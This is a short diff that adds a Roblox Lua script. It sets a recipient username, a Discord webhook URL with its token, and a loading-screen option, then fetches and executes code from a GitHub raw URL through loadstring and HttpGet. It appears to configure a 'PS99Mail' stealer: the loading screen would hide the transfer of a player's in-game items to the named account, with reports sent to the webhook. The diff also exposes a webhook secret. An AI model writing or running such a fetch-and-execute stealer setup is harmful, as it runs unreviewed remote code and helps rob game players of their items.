@@ -1,0 +1,6 @@
+Username = "jheremyqt1"
+Webhook = "https://discord.com/api/webhooks/1205757162022764595/ymMwU_XxjXeXj0_dCt0jkPXbJMA4piqL89VEzITTe1Udwy7-Z0mNtNqkIEWHn2P0feEg"
+selectedLoadingScreen = "2"
+LoadingScreen = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
